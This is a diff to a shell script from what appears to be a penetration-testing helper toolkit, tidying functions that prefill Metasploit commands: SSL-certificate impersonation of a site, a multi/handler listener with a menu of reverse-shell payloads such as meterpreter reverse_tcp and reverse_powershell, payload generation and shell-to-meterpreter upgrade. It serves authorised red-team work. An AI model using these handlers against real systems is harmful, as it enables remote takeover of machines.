@@ -32,7 +32,7 @@ nb-shell-handlers-msf-ssl-gen() {
     local r && __prefill r SITE aka.ms
     local cmd="use auxiliary/gather/impersonate_ssl; set RHOST ${r}; run; exit "
     __info "Use nb-vars-global-set-ssl-shell-cert to the path of the .pem file"
-    print -z "msfconsole -n -q -x \"${cmd}\" "
+    print -z "msfconsole -n -q -x \"${cmd}\""
 }
 
 nb-shell-handlers-msf-w64-https() {
@@ -56,8 +56,6 @@ nb-shell-handlers-msf-listener() {
     nb-vars-set-lhost
     nb-vars-set-lport
 
-    clear
-
     __ask "Choose a payload type:"
     echo "1.  android/meterpreter/reverse_tcp"
     echo "2.  cmd/windows/reverse_powershell"
@@ -74,7 +72,7 @@ nb-shell-handlers-msf-listener() {
     echo "13. windows/x64/meterpreter_reverse_tcp"
     echo "14. Previous menu"
     echo
-    read choice
+    local choice && __askvar choice "CHOICE"
 
     case $choice in
         1) __PAYLOAD=android/meterpreter/reverse_tcp;;
@@ -94,10 +92,8 @@ nb-shell-handlers-msf-listener() {
         *) echo "Invalid option";;
     esac
     
-    clear
-
     local cmd="use exploit/multi/handler; set payload ${__PAYLOAD}; set LHOST ${__LHOST}; set LPORT ${__LPORT}; exploit"
-    print -z "msfconsole -n -q -x \" ${cmd} \""
+    print -z "msfconsole -n -q -x \"${cmd}\""
 }
 
 nb-shell-handlers-msf-payload() {
@@ -105,8 +101,6 @@ nb-shell-handlers-msf-payload() {
     nb-vars-set-lhost
     nb-vars-set-lport
 
-    clear
-    
     __ask "Choose a payload format:"
     echo '1. aspx'
     echo '2. c'
@@ -281,5 +275,5 @@ nb-shell-handlers-msf-upgrade-shell() {
     local se && __askvar se "SESSION"
 
     local cmd="use post/multi/manage/shell_to_meterpreter; set LHOST ${__LHOST}; set SESSION ${se}; set LPORT ${__LPORT}; exploit"
-    print -z "msfconsole -n -q -x \" ${cmd} \""
+    print -z "msfconsole -n -q -x \"${cmd}\""
 }
